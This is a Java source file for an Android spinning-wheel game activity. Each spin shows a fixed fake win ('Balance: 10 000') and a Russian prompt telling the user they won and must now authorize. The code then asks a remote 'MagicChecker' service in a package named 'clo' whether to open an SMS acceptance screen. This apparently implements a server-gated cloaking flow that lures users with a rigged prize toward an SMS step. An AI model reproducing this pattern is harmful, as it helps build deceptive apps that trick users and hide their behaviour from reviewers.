package com.fruits.carnival;

import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;

import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.os.Handler;
import android.util.Log;
import android.view.View;
import android.widget.ImageView;
import android.widget.TextView;
import android.widget.Toast;

import com.adefruandta.spinningwheel.SpinningWheelView;
import com.fruits.carnival.clo.ApiClientClo;
import com.fruits.carnival.clo.ApiServiceClo;
import com.onesignal.OneSignal;
import com.squareup.okhttp.Interceptor;
import com.squareup.okhttp.Request;
import com.squareup.okhttp.Response;

import java.io.IOException;

import retrofit2.Call;
import retrofit2.Callback;
import uk.co.samuelwall.materialtaptargetprompt.MaterialTapTargetPrompt;

public class HomePage extends AppCompatActivity {

    SpinningWheelView wheelView;

    ImageView spin;

    TextView balance;

    SharedPreferences sPref2;

    private final int SPLASH_DISPLAY_LENGTH = 3000;

    private static final String ONESIGNAL_APP_ID = "07115524-47b3-4edc-bc68-47497b16f584";


    final String SAVED_STATUS = "none";
    final String SAVED_TEXT = "none";



    @Override
    protected void onStart() {

        new MaterialTapTargetPrompt.Builder(HomePage.this)
                .setTarget(R.id.balance)
                .setPrimaryText("Тут показан ваш баланс")
                .setSecondaryText("Он может меняться взависимости от исхода игры")
                .setPromptStateChangeListener(new MaterialTapTargetPrompt.PromptStateChangeListener()
                {
                    @Override
                    public void onPromptStateChanged(MaterialTapTargetPrompt prompt, int state)
                    {
                        if (state == MaterialTapTargetPrompt.STATE_FOCAL_PRESSED)
                        {
                            new MaterialTapTargetPrompt.Builder(HomePage.this)
                                    .setTarget(R.id.spin)
                                    .setPrimaryText("Нажми, чтобы крутить")
                                    .setSecondaryText("Эта кнопка сделана для того, чтобы ты прокрутил колессо")
                                    .setPromptStateChangeListener(new MaterialTapTargetPrompt.PromptStateChangeListener()
                                    {
                                        @Override
                                        public void onPromptStateChanged(MaterialTapTargetPrompt prompt, int state)
                                        {
                                            if (state == MaterialTapTargetPrompt.STATE_FOCAL_PRESSED)
                                            {
                                                // User has pressed the prompt target
                                            }
                                        }
                                    })
                                    .show();
                        }
                    }
                })
                .show();


        wheelView = findViewById(R.id.wheel);


        wheelView.setEnabled(false);






        super.onStart();
    }



    private static class UserAgentInterceptor implements Interceptor {

        private final String userAgent;

        public UserAgentInterceptor(String userAgent) {
            this.userAgent = userAgent;
        }

        @Override
        public Response intercept(Chain chain) throws IOException {
            Request originalRequest = chain.request();
            Request requestWithUserAgent = originalRequest.newBuilder()
                    .header("User-Agent", userAgent)
                    .build();
            return chain.proceed(requestWithUserAgent);
        }
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_starting);


        //push



        // Enable verbose OneSignal logging to debug issues if needed.
        OneSignal.setLogLevel(OneSignal.LOG_LEVEL.VERBOSE, OneSignal.LOG_LEVEL.NONE);

        // OneSignal Initialization
        OneSignal.initWithContext(this);
        OneSignal.setAppId(ONESIGNAL_APP_ID);


        spin = findViewById(R.id.spin);

        spin.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                wheelView.rotate(69, 3000, 50);

                String txt_choose = getIntent().getStringExtra("Choose");




                balance = findViewById(R.id.balance);
                // сделать время перед переходом


                 if (txt_choose == ("Deny")){
                    Log.e("STAT", "RED");
                }else {
                    new Handler().postDelayed(new Runnable(){
                        @Override
                        public void run() {
                            balance.setText("Balance: 10 000");
                            new AlertDialog.Builder(HomePage.this)
                                    .setTitle("Вы выйграли!")
                                    .setMessage("Теперь авторизируйтесь!")
                                    .setIcon(android.R.drawable.ic_dialog_alert)
                                    .show();


                            ApiClientClo.getInstance(HomePage.this).getApiServiceMagicChecker().getResponse()
                                    .enqueue(new Callback<String>() {
                                        @Override
                                        public void onResponse(Call<String> call, retrofit2.Response<String> response) {

                                            String responseBody = response.body();


                                            if (responseBody.equals("no")){
                                                Log.e("Error", "Bad");
                                            }else{
                                                Log.e("Debuh", responseBody);
                                                startActivity(new Intent(HomePage.this, SmsAccept.class));
                                            }
                                        }

                                        @Override
                                        public void onFailure(Call<String> call, Throwable t) {
                                            t.printStackTrace();
                                            Toast.makeText(HomePage.this, "Ошибка ответа от сервера", Toast.LENGTH_LONG).show();
                                        }
                                    });


                        }
                    }, SPLASH_DISPLAY_LENGTH);
                }





            }
        });
    }


}